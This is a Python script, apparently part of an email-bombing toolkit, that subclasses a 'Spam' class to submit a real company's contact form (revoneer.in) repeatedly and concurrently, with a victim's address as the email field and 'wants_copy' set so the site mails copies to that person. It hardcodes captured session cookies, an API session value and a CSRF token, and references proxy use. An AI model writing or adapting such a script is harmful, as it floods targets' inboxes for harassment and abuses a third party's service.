from os.path import basename

import requests

from module import Spam

cookies = {
    'PHPSESSID': 'o9uvvlgjb9ndecj32s3khki6uq',
    '_gcl_au': '1.1.6056581.1677758671',
    '_ga': 'GA1.2.384975733.1677758671',
    '_gid': 'GA1.2.733815399.1677758671',
    'revoneer_web_session': 'eyJpdiI6IjFRVVBxV0RnOUJEZlYrTlVhQUw2dHc9PSIsInZhbHVlIjoibzJ4TTdJWHQ0dWYvczlVcW40OEozYjloSGsraDRJTTB5ZFNpd1Q3aVBIR0cxck5hT0FBazFTU0dnQ3Izc3dmTiIsIm1hYyI6ImI4YjM1MTY3Y2JjNzBlMzA2NTAwNDlkNzhjNGZjMTJmZTdjMDBjZDNiODc2MzhiZGE2ODEzZjRmZjFiYzNlNjQifQ%3D%3D',
    '_gat': '1',
}

headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    # 'Cookie': 'PHPSESSID=o9uvvlgjb9ndecj32s3khki6uq; _gcl_au=1.1.6056581.1677758671; _ga=GA1.2.384975733.1677758671; _gid=GA1.2.733815399.1677758671; revoneer_web_session=eyJpdiI6IjFRVVBxV0RnOUJEZlYrTlVhQUw2dHc9PSIsInZhbHVlIjoibzJ4TTdJWHQ0dWYvczlVcW40OEozYjloSGsraDRJTTB5ZFNpd1Q3aVBIR0cxck5hT0FBazFTU0dnQ3Izc3dmTiIsIm1hYyI6ImI4YjM1MTY3Y2JjNzBlMzA2NTAwNDlkNzhjNGZjMTJmZTdjMDBjZDNiODc2MzhiZGE2ODEzZjRmZjFiYzNlNjQifQ%3D%3D; _gat=1',
    'Origin': 'https://www.revoneer.in',
    'Pragma': 'no-cache',
    'Referer': 'https://www.revoneer.in/en/cms/contact',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'revoneer_api_session': 'eyJpdiI6IlFUdC83UjFMWUZaS1U0eHlLWFl1SVE9PSIsInZhbHVlIjoiUDJQSzZjekRQN2NkYzRLVGVXdHFXMENrejlrQWlJU2dNS1NVL080YnZVTVIrUVVtSS9PY2RFdTk0MlNubEVCRXc0a1NTOGpxMG1xTVNKNDFIdWVDR05lR0F0TTNYUUVGSmdkZlB2YkxUZThnZ3ZvVGVJNUFWK3luNk40T0xydU5tZkNZMkd4N2dMSi9HL3NSbVM3d3hnakxXVHFZckttNzkrN044d3BtVEI4VVU0cjFEbVExQVpnU0luWG5qV25IRklWR2ozbk5mRFgzakJPYk94WmQzZW9xd0laUGkzVElaR0cvcDhUbkZtaz0iLCJtYWMiOiI5MDI2NmYwYmUzMWIwNzZjNWY4ZWZjMzZmYWM3MjMzNWQyMGQ3YzAxYzQ4NjcyNzA4YzVlNjc5OWE5NDAwYTViIn0=',
    'revoneer_csrf_token': 'D9XLwOGYBh7GxUeLHgddUu1EPDzkrxuqYkWOTKOu',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

params = ''

s = 'created_at'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        text = self.get_text(False)
        json_data = {
            'gender': '3',
            'firstname': text,
            'lastname': text,
            'email': target,
            'message': text,
            'subject': text,
            'phone': text,
            'wants_copy': True,
            'locale': 'en',
        }

        response = requests.post(
            'https://www.revoneer.in/api/contact/form/submit',
            params=params,
            cookies=cookies,
            headers=headers,
            # json=json_data, proxies=self.get_proxies(), timeout=20
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(20)


if __name__ == '__main__':
    main()
